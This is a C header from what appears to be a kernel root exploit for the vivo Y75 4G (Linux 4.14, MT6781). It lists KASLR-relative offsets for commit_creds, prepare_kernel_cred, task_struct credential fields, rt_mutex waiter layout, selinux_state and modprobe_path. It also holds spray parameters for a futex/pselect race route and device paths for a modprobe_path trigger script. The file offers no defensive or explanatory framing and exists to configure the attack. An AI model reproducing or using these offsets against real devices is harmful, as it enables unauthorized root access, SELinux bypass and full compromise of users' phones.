/* target_y75.h — vivo Y75 4G (PD2150CF / MT6781 Helio G96)
 * Kernel: Linux 4.14.186-g6de895749-dirty
 * Arch:   ARM64, 4KB pages, 39-bit VA (3-level)
 * Compiled base: 0xffffff8008000000 (_text / _stext 0xffffff8008080000)
 * KASLR: ON — leak runtime base each boot via perf_leak
 *
 * Canonical offsets: vmlinux_new.elf (Ghidra) + kallsyms_output.txt (111k syms)
 * All image-relative (add runtime KASLR base).
 * This is the ONLY header to edit — files/target.h duplicate removed.
 */

#ifndef TARGET_Y75_H
#define TARGET_Y75_H

#include <stdint.h>

/* ── Memory layout ─────────────────────────────────────────────────────── */
#define KIMAGE_TEXT_BASE_STATIC  0xffffff8008000000ULL /* compile-time _text */
#define KIMAGE_STEXT_STATIC      0xffffff8008080000ULL /* _stext */
#define PAGE_OFFSET_KERNEL       0xffffffc000000000ULL /* 39-bit VA */
#define PAGE_SHIFT               12
#define PAGE_SIZE                4096
#define VA_BITS                  39
#define PGTABLE_LEVELS           3

/* Runtime resolve: runtime_addr = kaslr_base + offset */
#define KADDR(off)               (kaslr_base + (uint64_t)(off))
#define OFFSET(off)              KADDR(off)  /* compat alias */

/* ── Credential primitives (Ghidra vmlinux_new.elf) ────────────────────── */
#define COMMIT_CREDS_OFF         0x000e6170ULL
#define PREPARE_KERNEL_CRED_OFF  0x000e6508ULL

/* ── task_struct (Ghidra ldr offsets) ──────────────────────────────────── */
#define TASK_CRED_OFF            0x640
#define TASK_REAL_CRED_OFF       0x638
#define TASK_PI_BLOCKED_ON_OFF   0x8e0
#define TASK_PI_LOCK_OFF         0x8bc
#define TASK_PRIO_OFF            0xbc
#define TASK_DEADLINE_OFF        0x3c8
/* cred->uid at cred+0x04 etc — include if cred-write path is used */
#define CRED_UID_OFF             0x04

/* ── rt_mutex_waiter (Ghidra rt_mutex_init_waiter) ─────────────────────── */
#define WAITER_RB_ENTRY_OFF      0x00  /* rb_node.__rb_parent_color */
#define WAITER_TASK_OFF          0x18  /* task pointer */
#define WAITER_LOCK_OFF          0x38  /* lock pointer (=0x38, not 0x30) */
#define WAITER_LOCK_OFF_REAL     0x38

/* ── rt_mutex / rbtree (kallsyms) ──────────────────────────────────────── */
#define RT_MUTEX_WAITERS_OFF     0x8c8   /* rt_mutex.waiters rb_root_cached */
#define RT_MUTEX_ADJUST_PRIO_CHAIN_OFF 0x0013c9e4ULL
#define RB_ERASE_CACHED_OFF      0x01263580ULL
#define RB_INSERT_COLOR_CACHED_OFF 0x0126343cULL

/* ── Futex / syscalls (kallsyms) ───────────────────────────────────────── */
#define DO_FUTEX_OFF             0x0018caa8ULL  /* do_futex */
#define REMOVE_WAITER_OFF        0x0013d7d4ULL

/* ── Security / init (kallsyms — corrected against kallsyms_output.txt) ── */
#define SECURITY_HOOK_HEADS_OFF  0x01913f20ULL
#define SELINUX_ENFORCING_OFF    0x01914b08ULL  /* selinux_state 0x9994b08 - _text 0x8080000 */
#define MODPROBE_PATH_OFF        0x023bc9a0ULL  /* modprobe_path */
#define INIT_TASK_OFF            0x02390000ULL  /* init_thread_union 0xa410000 - _text 0x8080000; was 0x02410000 for __start_init_task+0x20000 */

/* ── ashmem (kallsyms — for IonStack fops redirect path) ───────────────── */
#define ASHMEM_FOPS_OFF          0x011ed3c0ULL
#define ASHMEM_IOCTL_OFF         0x00d70018ULL
#define ASHMEM_MMAP_OFF          0x00d70728ULL
#define ASHMEM_OPEN_OFF          0x00d70894ULL
#define ASHMEM_RELEASE_OFF       0x00d70928ULL

/* ── Device / build meta ───────────────────────────────────────────────── */
#define TARGET_DEVICE            "vivo Y75 (PD2150CF / MT6781 Helio G96)"
#define TARGET_KERNEL            "4.14.186-g6de895749-dirty"
#define TARGET_ARCH              "ARM64"
#define TARGET_VA_BITS           39

/* ── GhostLock pselect route (IonStack canonical) ────────────────────────
 * Do NOT use NFDS=1024 / hand math from y75_v4. Use IonStack route:
 *   PSELECT_ROUTE_NFDS=320, PSELECT_WAITER_SHIFT from offsets table,
 *   waiter size 0x58 (compact, 4.14) vs 0x70 (rt_waiter_node, 6.x).
 * Feasibility must be checked via tools/check_feasibility.py before
 * any spray — see y75_clean/logs/feasibility_*.txt.
 */
#define PSELECT_ROUTE_NFDS       320
/* PSELECT_WAITER_SHIFT is per-device from extract_target / offsets.h;
 * kept here only as fallback until extract_target populates device header */
#define PSELECT_WAITER_SHIFT_FALLBACK  1
#define WAIT_ROUTE_SECONDS       8
#define PSELECT_TIMEOUT_SEC      0
#define PSELECT_TIMEOUT_USEC     200000

/* ── Paths on device ───────────────────────────────────────────────────── */
#define MODPROBE_TRIGGER_FILE    "/data/local/tmp/r.sh"
#define MODPROBE_ROOT_MARKER     "/data/local/tmp/rooted"

#endif /* TARGET_Y75_H */
